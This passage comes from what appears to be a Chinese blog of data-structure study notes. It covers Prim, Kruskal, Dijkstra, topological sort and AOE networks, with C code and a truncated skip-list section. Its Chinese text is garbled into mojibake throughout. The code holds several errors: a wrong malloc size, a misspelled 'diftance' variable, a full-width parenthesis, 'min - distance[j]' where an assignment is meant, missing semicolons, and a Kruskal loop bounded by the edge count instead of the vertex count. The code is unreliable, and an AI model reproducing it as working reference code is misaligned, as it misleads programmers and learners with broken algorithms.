‘ï¼Œé¡¶ç‚¹ä¸èƒ½é‡å¤é€‰ç”¨ï¼Œç›´åˆ°æœ€å°ç”Ÿæˆæ ‘ä¸­æœ‰ <code>n-1</code> æ¡è¾¹ä¸ºæ­¢</p></li><li><p><code>component[j]</code>ç”¨æ¥è®°å½•å·²åŠ å…¥æœ€å°ç”Ÿæˆæ ‘çš„é¡¶ç‚¹ <code>j</code>ï¼Œåˆå§‹åŒ–<code>component[j] = 0</code>ï¼Œå½“é¡¶ç‚¹<code>j</code>åŠ å…¥æœ€å°ç”Ÿæˆæ ‘åï¼Œè®¾ç½®<code>component[j] = 1</code></p></li><li><p><code>distance[j]</code>ç”¨æ¥è®°å½•ä»£ä»·æœ€å°çš„è¾¹çš„æƒå€¼ï¼Œåˆå§‹åŒ–<code>distance[j] = garphMatrix-&gt;graph[0][j]</code></p></li><li><p><code>neighbor[j]</code>ç”¨æ¥è®°å½•ä»£ä»·æœ€å°çš„è¾¹å¯¹åº”çš„é¡¶ç‚¹ï¼Œåˆå§‹åŒ–<code>neighbor[j] = 0</code></p></li><li><p>ç®—æ³•å®ç°ï¼š</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">GraphMatrix* <span class="title function_">prim</span><span class="params">(GraphMatrix *graphMatrix,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> *component = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(graphMatrix-&gt;size));<span class="comment">//æ–°ç‚¹é›†åˆ</span></span><br><span class="line">    <span class="type">int</span> *diftance = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(graphMatrix-&gt;size));<span class="comment">//è·ç¦»</span></span><br><span class="line">    <span class="comment">//é‚»å±…ï¼Œä¾‹å¦‚ neighbor[j] = 1 è¡¨ç¤º j çš„é‚»å±…æ˜¯ 1</span></span><br><span class="line">    <span class="type">int</span> *neighbor = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(graphMatrix-&gt;size));</span><br><span class="line">    GraphMatrix *tree = IniGraph(graphMatrix-&gt;size);<span class="comment">//å­˜æ”¾ç»“æœçš„å›¾</span></span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        component[j] = <span class="number">0</span>;</span><br><span class="line">        distance[j] = graphMatrix-&gt;graph[source][j];</span><br><span class="line">        neighbor[j] = source;</span><br><span class="line">    &#125;<span class="comment">//end 9</span></span><br><span class="line">    component[source] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v;</span><br><span class="line">        <span class="type">int</span> min = MAX;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)<span class="comment">//é€‰æ‹©ä¸æ˜¯æ–°ç‚¹é›†åˆä¸­çš„è·ç¦»æ–°ç‚¹é›†åˆæœ€çŸ­çš„é‚£ä¸ªç‚¹</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>ï¼ˆ!component[j] &amp;&amp; (distance[j]&lt;min))</span><br><span class="line">            &#123;</span><br><span class="line">                v = j;</span><br><span class="line">                min = distance[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">//end 20</span></span><br><span class="line">        <span class="keyword">if</span>(min&lt;MAX)</span><br><span class="line">        &#123;</span><br><span class="line">            component[v] = <span class="number">1</span>;</span><br><span class="line">            tree-&gt;graph[v][neighbor[v]] = distance[v];</span><br><span class="line">            tree-&gt;graph[neighbor[v]][v] = distance[v];</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!component[j] &amp;&amp; (graphMatrix-&gt;graph[v][j]&lt;distance[j]))</span><br><span class="line">                &#123;</span><br><span class="line">                    distance[j] = graphMatrix-&gt;graph[v][j];</span><br><span class="line">                    neighbor[j] = v;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="comment">//end 34</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">    &#125;<span class="comment">//end 16</span></span><br><span class="line">    <span class="keyword">return</span> tree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Kruskaiç®—æ³•"><a href="#Kruskaiç®—æ³•" class="headerlink" title="Kruskaiç®—æ³•"></a>Kruskaiç®—æ³•</h3><ul><li>ç®—æ³•æ€è·¯ï¼šå…ˆæŠŠæ‰€æœ‰é¡¶ç‚¹åŠ å…¥æœ€å°ç”Ÿæˆæ ‘ï¼Œç„¶åé€‰æ‹©åˆé€‚çš„è¾¹æ„å»ºæœ€å°ç”Ÿæˆæ ‘ï¼Œè¾¹çš„æƒå€¼æœ€å°ä¸”ä¸¤ä¸ªç‚¹è¦å±äºä¸¤ä¸ªä¸åŒçš„è¿é€šåˆ†é‡ï¼Œç›´åˆ°æœ€å°ç”Ÿæˆæ ‘ä¸­æœ‰ <code>n-1 </code>æ¡è¾¹ä¸ºæ­¢</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EDGE_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> begin;<span class="comment">//è¾¹çš„èµ·ç‚¹</span></span><br><span class="line">    <span class="type">int</span> end;<span class="comment">//è¾¹çš„ç»ˆç‚¹</span></span><br><span class="line">    <span class="type">int</span> weight; <span class="comment">//è¾¹çš„æƒå€¼</span></span><br><span class="line">&#125;Edge;</span><br><span class="line">GraphMatrix* <span class="title function_">kruskal</span><span class="params">(GraphMatrix *graphMatrix)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    <span class="type">int</span> edgeNum = <span class="number">0</span>;</span><br><span class="line">    Edge *edge = <span class="literal">NULL</span>;</span><br><span class="line">    Edge tempEdge;<span class="comment">//ç»™è¾¹æ’åºæ—¶çš„ä¸´æ—¶å˜é‡</span></span><br><span class="line">    <span class="type">int</span> pos;<span class="comment">//è®°å½•æ·»åŠ åˆ°å“ªæ¡è¾¹</span></span><br><span class="line">    <span class="type">int</span> *group;<span class="comment">//è®°å½•ç‚¹æ˜¯å¦å±äºåŒä¸€è¿é€šåˆ†é‡</span></span><br><span class="line">    <span class="type">int</span> changeGroup;<span class="comment">//è®°å½•è¦å˜åŒ–çš„è¿é€šå€¼</span></span><br><span class="line">    GraphMatrix * tree = IniGraph(graphMatrix-&gt;size);<span class="comment">//å­˜æ”¾ç»“æœçš„å›¾</span></span><br><span class="line">    group = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)<span class="comment">//åˆå§‹åŒ–ï¼Œç‚¹ä¹‹é—´ä¸è¿é€š</span></span><br><span class="line">        group[i] = i;</span><br><span class="line">    <span class="comment">//åˆ†ææœ‰å¤šå°‘æ¡è¾¹</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(graphMatrix-&gt;graph[i][j]&lt;INT_MAX)</span><br><span class="line">                edgeNum++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ ¹æ®åˆšè®¡ç®—å‡ºæ¥çš„è¾¹çš„æ•°é‡åˆ†æ´¾ç©ºé—´</span></span><br><span class="line">    edge = (Edge*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Edge)*edgeNum);</span><br><span class="line">    k = <span class="number">0</span>;<span class="comment">//ç»™è¾¹èµ‹å€¼çš„æ—¶å€™ç”¨</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(graphMatrix-&gt;graph[i][j]&lt;INT_MAX)</span><br><span class="line">            &#123;</span><br><span class="line">                edge[k].begin = i;</span><br><span class="line">                edge[k].end = j;</span><br><span class="line">                edge[k].weight = graphMatrix-&gt;graph[i][j];</span><br><span class="line">                k++</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;edgeNum;i++)<span class="comment">//æ ¹æ®è¾¹æƒå€¼è¿›è¡Œæ’åº</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;edgeNum;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(edge[i].weight&gt;edge[j].weight)</span><br><span class="line">            &#123;</span><br><span class="line">                tempEdge = edge[i];</span><br><span class="line">                edge[i] = edge[j];</span><br><span class="line">                edge[j] = tempEdge;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ¯æ¬¡ä»è¾¹æ•°ç»„ä¸­å–å‡ºæœ€å°çš„ä¸€æ¡è¾¹ï¼Œåˆ¤æ–­æ˜¯å¦èƒ½æ·»åŠ åˆ°æœ€å°ç”Ÿæˆæ ‘ä¸­</span></span><br><span class="line">    <span class="comment">//è¾¹æ•°ç»„å·²æ’å¥½åº</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;edgeNum;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//åªæ·»åŠ ç»ˆç‚¹å’Œä¸ƒç‚¹å±äºä¸¤ä¸ªä¸åŒè¿é€šåˆ†é‡çš„è¾¹</span></span><br><span class="line">        <span class="keyword">if</span>(group[edge[i].begin]!=group[edge[i].end])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//æ·»åŠ åˆ°æ ‘ä¸­</span></span><br><span class="line">            tree-&gt;graph[edge[i].begin][edge[i].end] = edge[i].weight;</span><br><span class="line">            tree-&gt;graph[edge[i].end][edge[i].begin] = edge[i].weight;</span><br><span class="line">            <span class="comment">//æ›´æ–°æ‰€æœ‰è·Ÿç»ˆç‚¹å±äºåŒä¸€è¿é€šåˆ†é‡çš„ç‚¹çš„è¿é€šæ€§</span></span><br><span class="line">            changeGroup = group[edge[i].end];</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;edgeNum;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(group[j] == changeGroup)</span><br><span class="line">                    group[j] = group[edge[i].begin];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dijstraç®—æ³•"><a href="#Dijstraç®—æ³•" class="headerlink" title="Dijstraç®—æ³•"></a>Dijstraç®—æ³•</h2><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201217053107.png"></p><ul><li>ç®—æ³•å®ç°ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* <span class="title function_">dijkstra</span><span class="params">(GraphMatrix * graphMatrix,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,vex,min;</span><br><span class="line">    <span class="comment">//foundæ•°ç»„ç”¨äºè®°å½•å“ªäº›ç‚¹æ˜¯æ–°ç‚¹é›†åˆçš„ï¼Œå“ªäº›ä¸æ˜¯</span></span><br><span class="line">    <span class="type">int</span>* found = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="comment">//è·ç¦»æ•°ç»„ï¼Œåœ¨ç®—æ³•è¿‡ç¨‹ä¸­ä¸æ–­æ›´æ–°ï¼Œæœ€åç»“æœä¹Ÿåœ¨è¿™</span></span><br><span class="line">    <span class="type">int</span>* distance = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="type">int</span>* path = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        found[i] = <span class="number">0</span>;</span><br><span class="line">        path[i] = <span class="number">0</span>;</span><br><span class="line">        distance[i] = graphMatrix-&gt;graph[source][i];</span><br><span class="line">    &#125;<span class="comment">//end 9</span></span><br><span class="line">    <span class="comment">//å°†èµ·ç‚¹åŠ å…¥æ–°ç‚¹é›†åˆä¸­</span></span><br><span class="line">    found[source] = <span class="number">1</span>;</span><br><span class="line">    distance[source] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//æ¯æ¬¡åŠ å…¥ä¸€ä¸ªç‚¹åˆ°æ–°ç‚¹é›†åˆä¸­ï¼Œè§„åˆ™æ˜¯å½“å‰è·ç¦»æœ€å°çš„</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        min = MAX;<span class="comment">//å¯»æ‰¾è·ç¦»æœ€å°çš„ç‚¹</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!found[j] &amp;&amp; (distance[j]&lt;min))</span><br><span class="line">            &#123;</span><br><span class="line">                vex = j;</span><br><span class="line">                min - distance[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">//end 22</span></span><br><span class="line">        found[vex] = <span class="number">1</span>;<span class="comment">//æ‰¾åˆ°çš„ç‚¹åŠ å…¥æ–°ç‚¹é›†åˆ</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!found[j] &amp;&amp; graphMatrix-&gt;graph[vex][j]!=MAX)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(min+graphMatrix-&gt;graph[vex][j]&lt;distance[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    distance[j] = min + graphMatrix-&gt;graph[vex][j];</span><br><span class="line">                    path[j] = vex;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">//end 31</span></span><br><span class="line">    &#125;<span class="comment">//end 19</span></span><br><span class="line">    <span class="keyword">return</span> distance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ‹“æ‰‘æ’åºï¼ˆAOVç½‘ï¼‰"><a href="#æ‹“æ‰‘æ’åºï¼ˆAOVç½‘ï¼‰" class="headerlink" title="æ‹“æ‰‘æ’åºï¼ˆAOVç½‘ï¼‰"></a>æ‹“æ‰‘æ’åºï¼ˆAOVç½‘ï¼‰</h2><ul><li>æœ‰å‘å›¾</li><li>æ— ç¯å›¾</li><li>å®šç‚¹è¡¨ç¤ºæ´»åŠ¨</li><li>è¾¹è¡¨ç¤ºæ´»åŠ¨é—´çš„å…ˆåå…³ç³»</li><li>æ’åºæ–¹æ³•<ul><li>ä»AOVç½‘ä¸­é€‰æ‹©ä¸€ä¸ª<code>å…¥åº¦ä¸º0</code>çš„é¡¶ç‚¹è¾“å‡º</li><li>åœ¨AOVç½‘ä¸­<code>åˆ é™¤</code>æ­¤é¡¶ç‚¹å’Œå®ƒçš„æ‰€æœ‰å‡ºè¾¹</li><li>åå¤åˆ°è¾“å‡ºæ‰€æœ‰é¡¶ç‚¹</li></ul></li></ul><blockquote><p>AOVç½‘çš„æ‹“æ‰‘åºåˆ—ä¸å”¯ä¸€</p><p>æœ‰å›ç¯ä¸å­˜åœ¨æ‹“æ‰‘åºåˆ—</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201217211908.png"></p><ul><li>ç®—æ³•æ€è·¯ï¼š<ul><li>è®¡ç®—å„ä¸ªé¡¶ç‚¹çš„å…¥åº¦</li><li>å°†å…¥åº¦ä¸º0çš„é¡¶ç‚¹å…¥æ ˆ</li><li>å¦‚æœæ ˆä¸ç©ºï¼Œå–å‡ºå…ƒç´  v å¹¶è¾“å‡º</li><li>æ£€æŸ¥é¡¶ç‚¹ v çš„å‡ºè¾¹è¡¨ï¼Œå°†å‡ºè¾¹è¡¨ä¸­çš„æ¯ä¸ªé¡¶ç‚¹ w çš„å…¥åº¦å‡ä¸€ï¼Œå¦‚ w çš„å…¥åº¦ä¸º 0 ï¼Œé¡¶ç‚¹ w å…¥æ ˆ</li><li>é‡å¤ç›´åˆ°æ ˆç©º</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">topologicalsort</span><span class="params">(GraphList *graphList)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> nodeNum;</span><br><span class="line">    <span class="type">int</span> success = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="type">int</span>&gt;nodeStack;</span><br><span class="line">    <span class="comment">//ä½¿ç”¨STLä¸­çš„stack</span></span><br><span class="line">    GraphListNode *tempNode = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> *inPoint = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphList-&gt;size);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">        inPoint[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)<span class="comment">//è®¡ç®—é¡¶ç‚¹çš„å…¥åº¦</span></span><br><span class="line">    &#123;</span><br><span class="line">        tempNode = graphList-&gt;graphListArray[i].next;</span><br><span class="line">        <span class="keyword">while</span>(tempNode!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            inPoint[tempNode-&gt;nodeno]++;</span><br><span class="line">            tempNode = tempNode-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(inPoint[i] == <span class="number">0</span>)</span><br><span class="line">            nodeStack.push(i)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!nodeStack.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        nodeNum = nodeStack.top();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,nodeNum);</span><br><span class="line">        nodeStack.pop();</span><br><span class="line">        count++;</span><br><span class="line">        <span class="comment">//æ£€æŸ¥vçš„å‡ºè¾¹ï¼Œå°†æ¯æ¡å‡ºè¾¹çš„ç»ˆç«¯é¡¶ç‚¹çš„å…¥åº¦ -1 ï¼Œè‹¥è¯¥é¡¶ç‚¹çš„å…¥åº¦ä¸º 0 ï¼Œå…¥æ ˆ</span></span><br><span class="line">        tempNode = graphList-&gt;graphListArray[nodeNum].next;</span><br><span class="line">        <span class="keyword">while</span>(tempNode!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            inPoint[tempNode-&gt;nodeno]--;</span><br><span class="line">            <span class="keyword">if</span>(inPoint[tempNode-&gt;nodeno]==<span class="number">0</span>)</span><br><span class="line">                nodeStack.push(tempNode-&gt;nodeno);</span><br><span class="line">            tempNode = tempNode-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count!=graphList-&gt;size)</span><br><span class="line">        success = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å…³é”®è·¯å¾„ï¼ˆAOEç½‘ï¼‰"><a href="#å…³é”®è·¯å¾„ï¼ˆAOEç½‘ï¼‰" class="headerlink" title="å…³é”®è·¯å¾„ï¼ˆAOEç½‘ï¼‰"></a>å…³é”®è·¯å¾„ï¼ˆAOEç½‘ï¼‰</h2><ul><li>å¸¦æƒçš„æœ‰å‘å›¾</li><li>é¡¶ç‚¹è¡¨ç¤ºæ—¶é—´ï¼Œæœ‰å‘è¾¹è¡¨ç¤ºæ´»åŠ¨</li><li>è¾¹ä¸Šçš„æƒå€¼è¡¨ç¤ºæ´»åŠ¨æŒç»­çš„æ—¶é—´</li><li>é¡¶ç‚¹æ‰€è¡¨ç¤ºçš„äº‹ä»¶å®é™…ä¸Šå°±æ˜¯å®ƒçš„å…¥è¾¹æ‰€è¡¨ç¤ºçš„æ´»åŠ¨éƒ½å·²å®Œæˆï¼Œå®ƒçš„å‡ºè¾¹æ‰€è¡¨ç¤ºçš„æ´»åŠ¨å¯ä»¥å¼€å§‹è¿™æ ·ä¸€ç§çŠ¶æ€</li><li>åªæœ‰ä¸€ä¸ªå…¥åº¦ä¸º 0 çš„é¡¶ç‚¹</li><li>åªæœ‰ä¸€ä¸ªå‡ºåº¦ä¸º 0 çš„é¡¶ç‚¹</li></ul><blockquote><p>å…·ä½“ç®—æ³•ä»¥åå†è¡¥</p></blockquote><h2 id="å…­åº¦ç©ºé—´"><a href="#å…­åº¦ç©ºé—´" class="headerlink" title="å…­åº¦ç©ºé—´"></a>å…­åº¦ç©ºé—´</h2><blockquote><p>æœ‰ç©ºå†å­¦ï¼Œç°åœ¨ä¸æ„Ÿå…´è¶£â€”â€”12.18</p></blockquote><h2 id="ä¸­å›½é‚®é€’å‘˜é—®é¢˜"><a href="#ä¸­å›½é‚®é€’å‘˜é—®é¢˜" class="headerlink" title="ä¸­å›½é‚®é€’å‘˜é—®é¢˜"></a>ä¸­å›½é‚®é€’å‘˜é—®é¢˜</h2><blockquote><p>æœ‰ç©ºå†å­¦ï¼Œç°åœ¨ä¸æ„Ÿå…´è¶£â€”â€”12.18</p></blockquote><h1 id="ç¬¬ä¸ƒç« -å­—å…¸"><a href="#ç¬¬ä¸ƒç« -å­—å…¸" class="headerlink" title="ç¬¬ä¸ƒç«  å­—å…¸"></a>ç¬¬ä¸ƒç«  å­—å…¸</h1><p>å­—å…¸æœ€é‡è¦çš„å°±æ˜¯æ£€ç´¢</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218024417.png"></p><h2 id="è·³è·ƒé“¾è¡¨"><a href="#è·³è·ƒé“¾è¡¨" class="headerlink" title="è·³è·ƒé“¾è¡¨"></a>è·³è·ƒé“¾è¡¨</h2><h3 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h3><p>è·³è·ƒé“¾è¡¨å°±æ˜¯åœ¨ç»“ç‚¹ä¸­å¢åŠ æŒ‡é’ˆåŸŸï¼Œè®©å…¶ç›´æ¥æŒ‡å‘å…¶ä»–çš„åç»§ç»“ç‚¹çš„æŒ‡é’ˆï¼Œä½¿å¾—è®¿é—®é“¾è¡¨çš„è¿‡ç¨‹ä¸­å¯ä»¥äº¤æ›¿è·³è¿‡å…¶ç›´æ¥åç»§ç»“ç‚¹</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218024815.png"></p><h3 id="å»ºç«‹å’ŒæŸ¥æ‰¾"><a href="#å»ºç«‹å’ŒæŸ¥æ‰¾" class="headerlink" 